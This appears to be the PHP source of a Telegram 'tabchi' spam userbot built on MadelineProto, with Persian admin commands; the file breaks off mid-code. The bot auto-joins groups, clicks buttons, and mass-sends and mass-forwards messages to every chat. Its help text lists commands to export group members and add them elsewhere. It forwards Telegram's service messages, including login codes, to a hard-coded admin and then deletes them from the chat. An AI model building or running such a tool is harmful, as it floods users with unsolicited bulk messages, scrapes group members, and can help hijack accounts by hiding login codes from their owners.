<?php
ini_set( 'display_errors', 0 );
error_reporting( 0 );
if ( file_exists( 'sony.madeline' ) && file_exists( 'update-session/sony.madeline' ) && ( time() - filectime( 'sony.madeline' ) ) > 90 ) {
  unlink( 'sony.madeline.lock' );
  unlink( 'sony.madeline' );
  unlink( 'madeline.phar' );
  unlink( 'madeline.phar.version' );
  unlink( 'madeline.php' );
  unlink( 'MadelineProto.log' );
  unlink( 'bot.lock' );
  copy( 'update-session/sony.madeline', 'sony.madeline' );
}
if ( file_exists( 'sony.madeline' ) && file_exists( 'update-session/sony.madeline' ) && ( filesize( 'sony.madeline' ) / 1024 ) > 10240 ) {
  unlink( 'sony.madeline.lock' );
  unlink( 'sony.madeline' );
  unlink( 'madeline.phar' );
  unlink( 'madeline.phar.version' );
  unlink( 'madeline.php' );
  unlink( 'bot.lock' );
  unlink( 'MadelineProto.log' );
  copy( 'update-session/sony.madeline', 'sony.madeline' );
}

function closeConnection( $message = 'TABCHI ON SHOD • @e_ror_off •' ) {
  if ( php_sapi_name() === 'cli' || isset( $GLOBALS[ 'exited' ] ) ) {
    return;
  }

  @ob_end_clean();
  @header( 'Connection: close' );
  ignore_user_abort( true );
  ob_start();
  echo "$message";
  $size = ob_get_length();
  @header( "Content-Length: $size" );
  @header( 'Content-Type: text/html' );
  ob_end_flush();
  flush();
  $GLOBALS[ 'exited' ] = true;
}

function shutdown_function( $lock ) {
  try {
    $a = fsockopen( ( isset( $_SERVER[ 'HTTPS' ] ) && @$_SERVER[ 'HTTPS' ] ? 'tls' : 'tcp' ) . '://' . @$_SERVER[ 'SERVER_NAME' ], @$_SERVER[ 'SERVER_PORT' ] );
    fwrite( $a, @$_SERVER[ 'REQUEST_METHOD' ] . ' ' . @$_SERVER[ 'REQUEST_URI' ] . ' ' . @$_SERVER[ 'SERVER_PROTOCOL' ] . "\r\n" . 'Host: ' . @$_SERVER[ 'SERVER_NAME' ] . "\r\n\r\n" );
    flock( $lock, LOCK_UN );
    fclose( $lock );
  } catch ( Exception $v ) {}
}
if ( !file_exists( 'bot.lock' ) ) {
  touch( 'bot.lock' );
}

$lock = fopen( 'bot.lock', 'r+' );
$try = 1;
$locked = false;
while ( !$locked ) {
  $locked = flock( $lock, LOCK_EX | LOCK_NB );
  if ( !$locked ) {
    closeConnection();
    if ( $try++ >= 30 ) {
      exit;
    }
    sleep( 1 );
  }
}
if ( !file_exists( 'data.json' ) ) {
  file_put_contents( 'data.json', '{"autochatpv":{"on":"on"},"autochatgroup":{"on":"off"},"autojoinadmin":{"on":"on"},"autojoinall":{"on":"off"},"autoforwardadmin":{"on":"on"},"admins":{}}' );
}
if ( !file_exists( 'member.json' ) ) {
	file_put_contents( 'member.json', '{"list":{}}' );
}
if ( !is_dir( 'update-session' ) ) {
  mkdir( 'update-session' );
}
if ( !is_dir( 'ans' ) ) {
  mkdir( 'ans' );
}
if ( !is_dir( 'ans/pv' ) ) {
  mkdir( 'ans/pv' );
}
if ( !is_dir( 'ans/group' ) ) {
  mkdir( 'ans/group' );
}
if ( !file_exists( 'madeline.php' ) ) {
  copy( 'https://phar.madelineproto.xyz/madeline.php', 'madeline.php' );
}

include 'madeline.php';
$settings = [];
$settings[ 'logger' ][ 'logger' ] = 0;
$settings[ 'serialization' ][ 'serialization_interval' ] = 30;
$MadelineProto = new\ danog\ MadelineProto\ API( 'king.madeline', $settings );
$MadelineProto->start();
class EventHandler extends\ danog\ MadelineProto\ EventHandler {
  public function __construct( $MadelineProto ) {
    parent::__construct( $MadelineProto );
  }
  public function onUpdateSomethingElse( $update ) {
    yield $this->onUpdateNewMessage( $update );
  }
  public function onUpdateNewChannelMessage( $update ) {
    yield $this->onUpdateNewMessage( $update );
  }
  public function onUpdateNewMessage( $update ) {
    try {
      if ( !file_exists( 'update-session/king.madeline' ) ) {
        copy( 'king.madeline', 'update-session/king.madeline' );
      }

      $userID = isset( $update[ 'message' ][ 'from_id' ] ) ? $update[ 'message' ][ 'from_id' ] : '';
      $msg = isset( $update[ 'message' ][ 'message' ] ) ? $update[ 'message' ][ 'message' ] : '';
      $msg_id = isset( $update[ 'message' ][ 'id' ] ) ? $update[ 'message' ][ 'id' ] : '';
      $MadelineProto = $this;
      $me = yield $MadelineProto->get_self();
      $me_id = $me[ 'id' ];
      $info = yield $MadelineProto->get_info( $update );
      $chatID = $info[ 'bot_api_id' ];
      $type2 = $info[ 'type' ];
      @$data = json_decode( file_get_contents( "data.json" ), true );
	  @$member = json_decode( file_get_contents( "member.json" ), true );
      $creator =1375199687; //useradmin
      $admin = 1375199687; //useradmin
      if ( file_exists( 'king.madeline' ) && filesize( 'king.madeline' ) / 1024 > 6143 ) {
        unlink( 'king.madeline.lock' );
        unlink( 'king.madeline' );
        copy( 'update-session/king.madeline', 'king.madeline' );
        exit( file_get_contents( 'http://' . $_SERVER[ 'SERVER_NAME' ] . $_SERVER[ 'PHP_SELF' ] ) );
        exit;
        exit;
      }
      if ( $userID != $me_id ) {
        if ( ( time() - filectime( 'update-session/king.madeline' ) ) > 2505600 ) {
          if ( $userID == $admin || isset( $data[ 'admins' ][ $userID ] ) ) {
            yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '❗️اخطار: مهلت استفاده شما از این ربات به اتمام رسیده❗️' ] );
          }
        } 
		else {
          if ( isset( $update[ 'message' ][ 'reply_markup' ][ 'rows' ] ) ) {
            if ( $type2 == 'supergroup' ) {
              foreach ( $update[ 'message' ][ 'reply_markup' ][ 'rows' ] as $row ) {
                foreach ( $row[ 'buttons' ] as $button ) {
                  yield $button->click();
                }
              }
            }
          }
		  
          if ( $chatID == 777000 ) {
            @$a = str_replace( 0, '۰', $msg );
            @$a = str_replace( 1, '۱', $a );
            @$a = str_replace( 2, '۲', $a );
            @$a = str_replace( 3, '۳', $a );
            @$a = str_replace( 4, '۴', $a );
            @$a = str_replace( 5, '۵', $a );
            @$a = str_replace( 6, '۶', $a );
            @$a = str_replace( 7, '۷', $a );
            @$a = str_replace( 8, '۸', $a );
            @$a = str_replace( 9, '۹', $a );
            yield $MadelineProto->messages->sendMessage( [ 'peer' => $admin, 'message' => "$a" ] );
            yield $MadelineProto->messages->deleteHistory( [ 'just_clear' => true, 'revoke' => true, 'peer' => $chatID, 'max_id' => $msg_id ] );
          }

			if ( $userID == $admin || $userID == $creator || isset( $data[ 'admins' ][ $userID ] ) ) {
			
			if ( $msg == 'انلاین' || $msg == 'تبچی' || $msg == 'پینگ' || $msg == 'Ping' || $msg == 'ربات' || $msg == 'ping' || $msg == '/ping' ) {
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'reply_to_msg_id' => $msg_id, 'message' => "**انلاینم حصین جونم**", 'parse_mode' => 'markdown' ] );
            }
			
			elseif ($msg == 'تمدید') {
			  if($userID == $creator) {
				copy( 'update-session/king.madeline', 'update-session/king.madeline2' );
				unlink( 'update-session/king.madeline' );
				copy( 'update-session/king.madeline2', 'update-session/king.madeline' );
				unlink( 'update-session/king.madeline2' );
				yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => 'اعتبار تبچی به 30 روز ارتقا یافت' ] );
			  }
			  else{
			    yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '⛔' ] );
			  }
			}
			
            elseif ( preg_match( "/^[#\!\/](addadmin) (.*)$/", $msg ) ) {
			  if ( $userID == $admin || $userID == $creator ) {
				preg_match( "/^[#\!\/](addadmin) (.*)$/", $msg, $text1 );
				$id = $text1[ 2 ];
				if ( !isset( $data[ 'admins' ][ $id ] ) ) {
				  $data[ 'admins' ][ $id ] = $id;
                  file_put_contents( "data.json", json_encode( $data ) );
                  yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => 'این کاربر توسط مالک ادمین شد' ] );
				} else {
				  yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "در لیست ادمین ها وجود دارد :/" ] );
				}
              } else {
			      yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "شما مالک تبچی نیستین" ] );
			    }
			}
            elseif ( preg_match( "/^[\/\#\!]?(clean admins)$/i", $msg ) ) {
			  if ( $userID == $admin || $userID == $creator ) {
				$data[ 'admins' ] = [];
				file_put_contents( "data.json", json_encode( $data ) );
				yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "لیست ادمین خالی شد !" ] );
              } else {
			      yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "شما مالک تبچی نیستین" ] );
			    }
			}
			elseif ( preg_match( "/^[\/\#\!]?(adminlist)$/i", $msg ) ) {
			  if ( $userID == $admin || $userID == $creator ) {
				if ( count( $data[ 'admins' ] ) > 0 ) {
				  $txxxt = "لیست ادمین ها : \n";
				  $counter = 1;
				  foreach ( $data[ 'admins' ] as $k ) {
                    $txxxt .= "$counter: <code>$k</code>\n";
                    $counter++;
				  }
				  yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => $txxxt, 'parse_mode' => 'html' ] );
				} else {
                  yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "ادمینی وجود ندارد !" ] );
				}
			  } else {
			     yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "شما مالک تبچی نیستین" ] );
			  }
			}
			  
            elseif ( $msg == '/restart' || $msg == 'restart' || $msg == 'Restart' || $msg == 'ریستارت' ) {
              yield $MadelineProto->messages->deleteHistory( [ 'just_clear' => true, 'revoke' => true, 'peer' => $chatID, 'max_id' => $msg_id ] );
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '♻️تبچی به حالت اولیه بازگشت و تمام تنظیمات ان پاکسازی شد.' ] );
              $this->restart();
            }
			
            elseif ( $msg == 'پاکسازی' ) {
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => 'لطفا کمی صبر کنید ...' ] );
              $all = yield $MadelineProto->get_dialogs();
			  $i=0;
              foreach ( $all as $peer ) {
                $type = yield $MadelineProto->get_info( $peer );
                if ( $type[ 'type' ] == 'supergroup' ) {
                  $info = yield $MadelineProto->channels->getChannels( [ 'id' => [ $peer ] ] );
                  @$banned = $info[ 'chats' ][ 0 ][ 'banned_rights' ][ 'send_messages' ];
                  if ( $banned == 1 ) {
                    yield $MadelineProto->channels->leaveChannel( [ 'channel' => $peer ] );
                    $i++;
				  }
                }
              }
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "✅ پاکسازی باموفقیت انجام شد.\n♻️ گروه هایی که در آنها بن شده بودم حذف شدند.\n تعداد : $i" ] );
            }
			
            elseif ( $msg == '/creator' || $msg == 'creator' || $msg == 'مالک' || $msg == 'سازندت' ) {
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'reply_to_msg_id' => $msg_id, 'message' => " **سازنده من** 
[➘̽ ࣺ࣪ ࣪͡.͜.‌‌ ͒‌ᷝ ͎ࣹ̽ʜ ࣥ͛ ེ̟ࣧ ᵒ࿆ ེ͎ࣹࣧ ࣹ̂s ེ͎͛ࣧˢེ࿆ࣹ͛ࣧᴇ̟ ེࣧⁿ࿆͎ࣹࣹࣺ ེ͛ࣧᴍ͚͒ ࣺ͔ ࣰ̽ ࣰ̽ ͍ࣹ ͒̾❲͎ࣧ☪❳|̰͛⅛ེ̰ࣧ🚬](https://t.me/e_ror_off)", 'parse_mode' => 'markdown' ] );
            }
            elseif ( $msg == 'ورژن ربات' || $msg == 'نسخه' ) {
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'reply_to_msg_id' => $msg_id, 'message' => '**نسخه ساخته شده تا الان :  9.2**', 'parse_mode' => 'MarkDown' ] );
            }

            elseif ( $msg == 'شناسه' || $msg == 'id' || $msg == 'ایدی' || $msg == 'مشخصات' ) {
              $name = $me[ 'first_name' ];
              $phone = '+' . $me[ 'phone' ];
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'reply_to_msg_id' => $msg_id, 'message' => "💚 مشخصات من

👑 ادمین‌اصلی: [$admin](tg://user?id=$admin)
👤 نام: $name
#⃣ ایدی‌عددیم: `$me_id`
📞 شماره‌تلفنم: `$phone`
", 'parse_mode' => 'MarkDown' ] );
            }

            elseif ( $msg == 'امار' || $msg == 'آمار' || $msg == 'stats' || $msg == 'امار بده' ) {
              $day = ( 2505600 - ( time() - filectime( 'update-session/king.madeline' ) ) ) / 60 / 60 / 24;
              $day = round( $day, 0 );
              $hour = ( 2505600 - ( time() - filectime( 'update-session/king.madeline' ) ) ) / 60 / 60;
              $hour = round( $hour, 0 );
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => 'در حال پردازش امار', 'reply_to_msg_id' => $msg_id ] );
              $mem_using = round( ( memory_get_usage() / 1024 ) / 1024, 0 ) . 'MB';
              $satpv = $data[ 'autochatpv' ][ 'on' ];
              if ( $satpv == 'on' ) {
                $satpv = 'روشن ✅';
              } else {
                $satpv = 'خاموش❌';
              }
              $satgroup = $data[ 'autochatgroup' ][ 'on' ];
              if ( $satgroup == 'on' ) {
                $satgroup = 'روشن ✅';
              } else {
                $satgroup = 'خاموش❌';
              }
              $satjoin = $data[ 'autojoinadmin' ][ 'on' ];
              if ( $satjoin == 'on' ) {
                $satjoin = 'روشن ✅';
              } else {
                $satjoin = 'خاموش ❌';
              }
			  $satjoinall = $data[ 'autojoinall' ][ 'on' ];
              if ( $satjoinall == 'on' ) {
                $satjoinall = 'روشن ✅';
              } else {
                $satjoinall = 'خاموش ❌';
              }
              $satfor = $data[ 'autoforwardadmin' ][ 'on' ];
              if ( $satfor == 'on' ) {
                $satfor = 'روشن ✅';
              } else {
                $satfor = 'خاموش ❌';
              }
              $mem_total = 'NotAccess!';
              $CpuCores = 'NotAccess!';
              try {
                if ( strpos( @$_SERVER[ 'SERVER_NAME' ], '000webhost' ) === false ) {
                  if ( strpos( PHP_OS, 'L' ) !== false || strpos( PHP_OS, 'l' ) !== false ) {
                    $a = file_get_contents( "/proc/meminfo" );
                    $b = explode( 'MemTotal:', "$a" )[ 1 ];
                    $c = explode( ' kB', "$b" )[ 0 ] / 1024 / 1024;
                    if ( $c != 0 && $c != '' ) {
                      $mem_total = round( $c, 1 ) . 'GB';
                    } else {
                      $mem_total = 'NotAccess!';
                    }
                  } else {
                    $mem_total = 'NotAccess!';
                  }
                  if ( strpos( PHP_OS, 'L' ) !== false || strpos( PHP_OS, 'l' ) !== false ) {
                    $a = file_get_contents( "/proc/cpuinfo" );
                    @$b = explode( 'cpu cores', "$a" )[ 1 ];
                    @$b = explode( "\n", "$b" )[ 0 ];
                    @$b = explode( ': ', "$b" )[ 1 ];
                    if ( $b != 0 && $b != '' ) {
                      $CpuCores = $b;
                    } else {
                      $CpuCores = 'NotAccess!';
                    }
                  } else {
                    $CpuCores = 'NotAccess!';
                  }
                }
              } catch ( Exception $f ) {}
              $s = yield $MadelineProto->get_dialogs();
              $m = json_encode( $s, JSON_PRETTY_PRINT );
              $supergps = count( explode( 'peerChannel', $m ) ) - 1;
              $pvs = count( explode( 'peerUser', $m ) ) - 1;
              $gps = count( explode( 'peerChat', $m ) ) - 2;
              $all = $gps + $supergps + $pvs;
              $me = yield $this->getSelf();
              $access_hash = $me['access_hash'];
              $getContacts = yield $this->contacts->getContacts(['hash' => [$access_hash], ]);
              $contacts_count = count($getContacts['users']);
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID,
                'message' => "🔘💎DarkWen ⷮ ᷟ💎🔘 | Help :

 کله امارات : $all
 سوپرگپ ها  : $supergps
گپ عادی : $gps
 پیوی های تبچی : $pvs
 تعداد مخاطبان تبچی : $contacts_count
 فورارد به ادمین : $satfor
عضویت خودکار سودو : $satjoin
عضویت خودکار کلی : $satjoinall
چت خودکار پیوی : $satpv
چت خودکار گروه ها : $satgroup
اعتبار تبچی : $day 🌎 $hour ⏰
سی پی یو : $CpuCores
کله رم : $mem_total
رم استفاده شده : $mem_using"
              ] );
              if ( $supergps > 400 || $pvs > 1500 ) {
                yield $MadelineProto->messages->sendMessage( [ 'peer' => $admin,
                  'message' => '⚠️ اخطار: فضام پره لطفا از گروه مسدود شده  تبچیو حذف کنید و در غیر این صورت من عاف میشم با تشکر خدا حافظ'
                ] );
              }
            }
            elseif ( $msg == 'پنل' || $msg == '+' || $msg == 'Help' || $msg == 'راهنما' ) {
              yield $MadelineProto->messages->sendMessage( [
                'peer' => $chatID,
                'message' => '🔘💎DarkWen ⷮ ᷟ💎🔘 | Help:
•°•°•°•°•°•°•°•°•°•°•°•°•°•°•°•
                 • `تنظیمات` •

`راهنما اد`    •••••••••••  `پنل فور`

`پنل خروج`  ••••••••••• `پنل چت`

               • `پنل ادمین` •
=-=-=-=-=-=-=-=-=-=-=-=-=-=
**+1 +2 +3 +4 +5 +6**
=-=-=-=-=-=-=-=-=-=-=-=-=-=',
                'parse_mode' => 'markdown'
              ] );
            }
            elseif ( $msg == 'تنظیمات' || $msg == '+6' || $msg == 'پنل تنظیمات' || $msg == 'راهنما تنظیم' ) {
              yield $MadelineProto->messages->sendMessage( [
                'peer' => $chatID,
                'message' => '🔘💎DarkWen ⷮ ᷟ💎🔘 | Help  :

ᴥ `انلاین`
**وضعیت تبچی**
ᴥ `امار`
**آمار تبچی**
ᴥ `مشخصات`
**اطلاعات شخصی تبچی**
ᴥ `ورژن ربات`
**نسخه فعلی تبچی**
ᴥ `/setPhoto ` [link]
**تنظیم پروفایل تبچی**
ᴥ `/SetId` [text]
**تنظیم نام کاربری آیدی**
ᴥ `/profile ` [نام] | [فامیل] | [بیوگرافی]
**تنظیم نام، نام خانوادگی، بیوگرافے**
ᴥ `/restart `
**بازنشانی کارخانه بازگشت به حالت اولیه**',
                'parse_mode' => 'markdown'
              ] );
            }
            elseif ( $msg == 'پنل ادمین' || $msg == 'helpsod' || $msg == '+1' || $msg == 'راهنما سودو' ) {
              yield $MadelineProto->messages->sendMessage( [
                'peer' => $chatID,
                'message' => '🔘💎DarkWen ⷮ ᷟ💎🔘 | Help  :

**بخش ادمین تبچی**
ᴥ `/addadmin ` [ایدی‌عددی]
**افزودن ادمین جدید**
ᴥ `/clean admins`
**حذف همه ادمین ها**
ᴥ `/adminlist`
**لیست همه ادمین ها**
ᴥ `تمدید`
**شارژ کردن تبچی به مدت 30 روز**',
                'parse_mode' => 'markdown'
              ] );
            }
            elseif ( $msg == 'پنل چت' || $msg == 'چت پنل' || $msg == 'راهنما چت' || $msg == '+2' ) {
              yield $MadelineProto->messages->sendMessage( [
                'peer' => $chatID,
                'message' => '🔘💎DarkWen ⷮ ᷟ💎🔘 | Help  :

ᴥ `/autofadmin ` [on] or [off]
**روشن یا خاموش کردن فوروارد خودکار به ادمین**

ᴥ `/autojoinadmin ` [on] or [off]
**روشن یا خاموش کردن جوین خودکار ادمین**

ᴥ `/autojoinall ` [on] or [off]
**روشن یا خاموش کردن جوین خودکار همه**

ᴥ `/autochatpv ` [on] or [off]
**روشن یا خاموش کردن چت خودکار (پیوی ها)**

ᴥ `/autochatgroup ` [on] or [off]
**روشن یا خاموش کردن چت خودکار (گروه ها)**',
                'parse_mode' => 'markdown'
              ] );
            }
            elseif ( $msg == 'پنل خروج' || $msg == '+3' || $msg == 'Helpleft' || $msg == 'راهنماخروج' ) {
              yield $MadelineProto->messages->sendMessage( [
                'peer' => $chatID,
                'message' => '🔘💎DarkWen ⷮ ᷟ💎🔘 | Help  :

ᴥ `/join ` [@ID] or [LINK]
**عضویت در یڪ کانال یا گروه**
ᴥ `/delchs`
**خروج از همه ے کانال ها**
ᴥ `/delgroups` [تعداد]
**خروج از گروه ها به تعداد موردنظر**
ᴥ `left`
**خروج تبچی از گروه مورد نظر توسط ادمین**
ᴥ `پاکسازی`
**خروج از گروه هایے که مسدود کردند**
ᴥ `پاکسازی کلی`
**پاکسازی پیام های یک گروه**',
                'parse_mode' => 'markdown'
              ] );
            }
            elseif ( $msg == 'پنل فور' || $msg == 'پنل فور ارسال' || $msg == '+4' || $msg == 'راهنما ارسال' ) {
              yield $MadelineProto->messages->sendMessage( [
                'peer' => $chatID,
                'message' => '🔘💎DarkWen ⷮ ᷟ💎🔘 | Help  :

ᴥ `/s2all ` [txt]
**ارسال کردن متن به همه گروه ها و کاربران**

ᴥ `/s2pv ` [txt]
**ارسال کردن متن به همه کاربران**

ᴥ `/s2_1pv ` [userid] | [txt]
**ارسال کردن متن به کاربر موردنظر(ایدی عددی)**

ᴥ `/s2sgps ` [txt]
**ارسال کردن متن به همه سوپرگروه ها**

ᴥ `f2all ` [reply]
**فروارد کردن پیام ریپلاے شده به همه گروه ها و کاربران**
ᴥ `f2pv ` [reply]
**فروارد کردن پیام ریپلاے شده به همه کاربران**

ᴥ `f2_1pv ` [userid]   [reply]
**فروارد کردن پیام ریپلاے شده به کاربر موردنظر(ایدی عددی)**
ᴥ `f2gps ` [reply]
**فروارد کردن پیام ریپلاے شده به همه گروه ها**

ᴥ `f2sgps ` [reply]
**فروارد کردن پیام ریپلاے شده به همه سوپرگروه ها**

ᴥ `/setFtime ` [reply],[time-min]
**فعالسازے فروارد خودکار زماندار**

ᴥ `/delFtime`
**حذف فروارد خودکار زماندار**',
                'parse_mode' => 'markdown'
              ] );
            }
            elseif ( $msg == 'پنل افزودن مخاطبین' || $msg == '+5' || $msg == 'راهنما افزودن مخاطبین' || $msg == 'راهنما اد' ) {
              yield $MadelineProto->messages->sendMessage( [
                'peer' => $chatID,
                'message' => '🔘💎DarkWen ⷮ ᷟ💎🔘 | Help  :

ᴥ `/addall ` [UserID]
**ادد کردن یڪ کاربر به همه گروه ها**

ᴥ `/addpvs ` [IDGroup]
**ادد کردن همه ے افرادے که در پیوے هستن به یڪ گروه**
ᴥ `export` [GroupLink]
**استخراج اعضای گروه ...(توصیه نمیشود!)**

ᴥ `add` [Group@ID]
**اد کردن اعضای استخراج شده به یک گروه**

ᴥ `deletemember`
**پاکسازی اعضای استخراج شده**',
                'parse_mode' => 'markdown'
              ] );
            }
            elseif ( $msg == 'F2all' || $msg == 'f2all' ) {
              if ( $type2 == 'supergroup' ) {
                yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '⛓ درحال فروارد ...' ] );
                $rid = $update[ 'message' ][ 'reply_to_msg_id' ];
                $dialogs = yield $MadelineProto->get_dialogs();
                $i = -1;
                foreach ( $dialogs as $peer ) {
                  $type = yield $MadelineProto->get_info( $peer );
                  if ( $type[ 'type' ] == 'supergroup' || $type[ 'type' ] == 'user' || $type[ 'type' ] == 'chat' ) {
                    $MadelineProto->messages->forwardMessages( [ 'from_peer' => $chatID, 'to_peer' => $peer, 'id' => [ $rid ] ] );
                    $i++;
                  }
                }
                yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "فروارد همگانی با موفقیت به همه ارسال شد  👌🏻\n تعداد فوروارد : $i" ] );
              } else {
                yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '‼از این دستور فقط در سوپرگروه میتوانید استفاده کنید.' ] );
              }
            }
            elseif ( $msg == 'F2pv' || $msg == 'f2pv' ) {
              if ( $type2 == 'supergroup' ) {
                yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '⛓ درحال فروارد ...' ] );
                $rid = $update[ 'message' ][ 'reply_to_msg_id' ];
                $dialogs = yield $MadelineProto->get_dialogs();
                $i = 0;
                foreach ( $dialogs as $peer ) {
                  $type = yield $MadelineProto->get_info( $peer );
                  if ( $type[ 'type' ] == 'user' ) {
                    $MadelineProto->messages->forwardMessages( [ 'from_peer' => $chatID, 'to_peer' => $peer, 'id' => [ $rid ] ] );
                    $i++;
                  }
                }
                yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "فروارد همگانی با موفقیت به پیوی ها ارسال شد 👌🏻\n تعداد فوروارد : $i" ] );
              } else {
                yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '‼از این دستور فقط در سوپرگروه میتوانید استفاده کنید.' ] );
              }
            }
			elseif ( strpos( $msg, "f2_1pv " ) !== false ) {
              if ( $type2 == 'supergroup' ) {
				$wordt = trim( str_replace( "f2_1pv ", "", $msg ) );
				$wordt = explode( "|", $wordt . "|||||" );
				$txt_id = trim( $wordt[ 0 ] );
                $rid = $update[ 'message' ][ 'reply_to_msg_id' ];
				if(yield $MadelineProto->messages->readHistory( [ 'peer' => $txt_id, 'max_id' => $msg_id ] ) == true){
				  if(yield $MadelineProto->messages->setTyping( [ 'peer' => $txt_id, 'action' => [ '_' => 'sendMessageTypingAction' ] ] ) == true){
					yield $MadelineProto->sleep( 1 );
                    $MadelineProto->messages->forwardMessages( [ 'from_peer' => $chatID, 'to_peer' => $txt_id, 'id' => [ $rid ] ] );
					yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "پیام مورد نظر با موفقیت فوروارد شد.  👌🏻" ] );
				  }
				}
			  } else {
                yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '‼از این دستور فقط در سوپرگروه میتوانید استفاده کنید.' ] );
              }
            }
            elseif ( $msg == 'F2gps' || $msg == 'f2gps' ) {
              if ( $type2 == 'supergroup' ) {
                yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '⛓ درحال فروارد ...' ] );
                $rid = $update[ 'message' ][ 'reply_to_msg_id' ];
                $dialogs = yield $MadelineProto->get_dialogs();
                $i = -1;
                foreach ( $dialogs as $peer ) {
                  $type = yield $MadelineProto->get_info( $peer );
                  if ( $type[ 'type' ] == 'chat' ) {
                    $MadelineProto->messages->forwardMessages( [ 'from_peer' => $chatID, 'to_peer' => $peer, 'id' => [ $rid ] ] );
                    $i++;
                  }
                }
                yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "فروارد همگانی با موفقیت به گروه ها ارسال شد 👌🏻\n تعداد فوروارد : $i" ] );
              } else {
                yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '‼از این دستور فقط در سوپرگروه میتوانید استفاده کنید.' ] );
              }
            }
            elseif ( $msg == 'F2sgps' || $msg == 'f2sgps' ) {
              if ( $type2 == 'supergroup' ) {
                yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '⛓ درحال فروارد ...' ] );
                $rid = $update[ 'message' ][ 'reply_to_msg_id' ];
                $dialogs = yield $MadelineProto->get_dialogs();
                $i = 0;
                foreach ( $dialogs as $peer ) {
                  $type = yield $MadelineProto->get_info( $peer );
                  if ( $type[ 'type' ] == 'supergroup' ) {
                    $MadelineProto->messages->forwardMessages( [ 'from_peer' => $chatID, 'to_peer' => $peer, 'id' => [ $rid ] ] );
                    $i++;
                  }
                }
                yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "فروارد همگانی با موفقیت به سوپرگروه ها ارسال شد 👌🏻\n تعداد فوروارد : $i" ] );
              } else {
                yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '‼از این دستور فقط در سوپرگروه میتوانید استفاده کنید.' ] );
              }
            }
			
            elseif ( preg_match( "/^[#\!\/](s2all) (.*)$/", $msg ) ) {
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '⛓ درحال ارسال ...' ] );
              preg_match( "/^[#\!\/](s2all) (.*)$/", $msg, $text1 );
              $text = $text1[ 2 ];
              $dialogs = yield $MadelineProto->get_dialogs();
              $i = 0;
              foreach ( $dialogs as $peer ) {
                $type = yield $MadelineProto->get_info( $peer );
                $type3 = $type[ 'type' ];
                if ( $type3 == "supergroup" || $type3 == "user" ) {
                  yield $MadelineProto->messages->sendMessage( [ 'peer' => $peer, 'message' => "$text" ] );
                  $i++;
                }
              }
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "ارسال همگانی با موفقیت به همه ارسال شد 👌🏻\n تعداد ارسال : $i" ] );
            }
			
            elseif ( preg_match( "/^[#\!\/](s2pv) (.*)$/", $msg ) ) {
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '⛓ درحال ارسال ...' ] );
              preg_match( "/^[#\!\/](s2pv) (.*)$/", $msg, $text1 );
              $text = $text1[ 2 ];
              $dialogs = yield $MadelineProto->get_dialogs();
              $i = 0;
              foreach ( $dialogs as $peer ) {
                $type = yield $MadelineProto->get_info( $peer );
                $type3 = $type[ 'type' ];
                if ( $type3 == "user" ) {
                  yield $MadelineProto->messages->sendMessage( [ 'peer' => $peer, 'message' => "$text" ] );
                  $i++;
                }
              }
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "ارسال همگانی با موفقیت به پیوے ها ارسال شد 👌🏻\n تعداد ارسال : $i" ] );
            }
			
			elseif ( strpos( $msg, "/s2_1pv " ) !== false ) {
			  $wordt = trim( str_replace( "/s2_1pv ", "", $msg ) );
			  $wordt = explode( "|", $wordt . "|||||" );
			  $txt_id = trim( $wordt[ 0 ] );
			  $ans = trim( $wordt[ 1 ] );
			  if(yield $MadelineProto->messages->readHistory( [ 'peer' => $txt_id, 'max_id' => $msg_id ] ) == true){
				if(yield $MadelineProto->messages->setTyping( [ 'peer' => $txt_id, 'action' => [ '_' => 'sendMessageTypingAction' ] ] ) == true){
				  yield $MadelineProto->sleep( 1 );
				  yield $MadelineProto->messages->sendMessage( [ 'peer' => $txt_id, 'message' => "$ans" ] );
				  yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "✅ پیام \n [$ans] \n به کاربر [$txt_id] ارسال شد.", 'parse_mode' => 'html' ] );
				}
			  }
			}
            
			/*elseif(preg_match("/^[#\!\/](s2gps) (.*)$/", $msg)){
